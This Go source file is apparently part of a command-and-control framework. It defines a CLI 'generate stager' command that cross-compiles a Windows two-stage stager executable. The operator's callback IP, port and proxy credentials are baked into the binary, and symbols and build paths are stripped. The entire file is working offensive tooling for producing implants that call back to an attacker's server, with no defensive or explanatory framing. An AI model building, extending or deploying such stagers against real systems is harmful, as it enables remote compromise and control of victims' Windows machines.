package grumblecli

import (
	"fmt"
	"os"
	"os/exec"
	"strings"

	"github.com/desertbit/grumble"
	"google.golang.org/grpc"
)

func SetGenerateStagerCommand(conn grpc.ClientConnInterface) {
	generateStagerCmd := &grumble.Command{
		Name: "stager",
		Help: "generate minimal two-stage stager (windows only)",
		Args: func(a *grumble.Args) {
			a.String("os", "windows only")
			a.String("transport", "http or https")
			a.String("address", "address for stager callback (IP:PORT)")
		},
		Flags: func(f *grumble.Flags) {
			f.String("t", "http-proxy-type", "none", "HTTP Proxy Type, can be HTTP or HTTPS")
			f.String("a", "http-proxy-address", "", "URL for example 127.0.0.1:8080")
			f.String("u", "http-proxy-username", "", "Proxy Username")
			f.String("p", "http-proxy-password", "", "Proxy Password")
			f.String("r", "arch", "64", "Target architecture: 32 or 64")
		},
		Run: func(c *grumble.Context) error {
			stagerOs := c.Args.String("os")
			transport := c.Args.String("transport")
			address := c.Args.String("address")

			if strings.ToLower(stagerOs) != "windows" {
				fmt.Println("Stager only supports Windows architecture")
				return nil
			}

			if transport != "http" && transport != "https" {
				fmt.Println("Transport must be http or https")
				return nil
			}

			if !strings.Contains(address, ":") {
				fmt.Println("Address must be in the form IP:PORT")
				return nil
			}

			addressParts := strings.Split(address, ":")
			stagerIP := addressParts[0]
			stagerPort := addressParts[1]

			arch := c.Flags.String("arch")
			if arch != "32" && arch != "64" {
				fmt.Println("arch must be 32 or 64")
				return nil
			}

			goarch := "amd64"
			cc := "x86_64-w64-mingw32-gcc"
			if arch == "32" {
				goarch = "386"
				cc = "i686-w64-mingw32-gcc"
			}

			proxyType := c.Flags.String("http-proxy-type")
			if proxyType != "http" && proxyType != "https" && proxyType != "none" {
				fmt.Println("Proxy should be http or https")
				return nil
			}

			proxyAddress := c.Flags.String("http-proxy-address")
			if proxyAddress != "" {
				proxyAddressSplit := strings.Split(proxyAddress, ":")
				if len(proxyAddressSplit) != 2 {
					fmt.Println("Proxy Address should be in the form IP:PORT")
					return nil
				}
			}

			proxyUsername := c.Flags.String("http-proxy-username")
			proxyPassword := c.Flags.String("http-proxy-password")

			ldflags := fmt.Sprintf("-s -w -X main.TargetIP=%s -X main.TargetPort=%s -X main.HTTPProxyType=%s -X main.HTTPProxyURL=%s -X main.HTTPProxyUsername=%s -X main.HTTPProxyPassword=%s", stagerIP, stagerPort, proxyType, proxyAddress, proxyUsername, proxyPassword)

			mainPath := fmt.Sprintf("beacon/main_stager_%s.go", transport)
			tags := fmt.Sprintf("-tags=stager_%s", transport)

			outName := fmt.Sprintf("stager_%s_%s.exe", transport, arch)

			cmd := exec.Command(
				"go", "build",
				"-ldflags", ldflags,
				"-trimpath",
				"-o", outName,
				tags,
				mainPath,
			)

			cmd.Env = append(os.Environ(),
				fmt.Sprintf("GOOS=%s", "windows"),
				fmt.Sprintf("GOARCH=%s", goarch),
				"CGO_ENABLED=1",
				fmt.Sprintf("CC=%s", cc),
			)

			cmd.Stdout = os.Stdout
			cmd.Stderr = os.Stderr

			fmt.Println(mainPath)
			err := cmd.Run()
			if err != nil {
				fmt.Println("Build failed:", err)
				return nil
			}

			fmt.Println(fmt.Sprintf("[+] Stager Generated at %s", outName))

			return nil
		},
	}

	if cmd := app.Commands().Get("generate"); cmd != nil {
		cmd.AddCommand(generateStagerCmd)
		return
	}

	generateCmd := &grumble.Command{
		Name: "generate",
		Help: "generate beacon or stager",
	}
	generateCmd.AddCommand(generateStagerCmd)
	app.AddCommand(generateCmd)
}
